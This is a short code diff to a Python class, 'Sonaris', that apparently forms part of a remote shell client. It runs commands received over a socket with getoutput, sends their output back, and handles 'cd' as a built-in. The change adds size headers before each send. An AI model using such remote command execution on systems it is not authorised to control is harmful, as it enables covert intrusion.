@@ -151,11 +151,21 @@ class Sonaris(object):
         command = getoutput(f'{command}')
         if(command != ''):
             if(len(command) >= 16384):
+                header = {
+                    "size": len(command),
+                }
+                self.__Client.send(dumps(header))
+                sleep(1)
                 self.__Client.send(command[:16376].encode())
             else:
+                header = {
+                    "size": len(command),
+                }
+                self.__Client.send(dumps(header))
+                sleep(1)
                 self.__Client.send(command.encode())
         else:
-            self.__Client.send('.'.encode())
+            self.__Client.send('done'.encode())
 
     def BultinCommands(self, command):
         if(command[:2] == 'cd'):
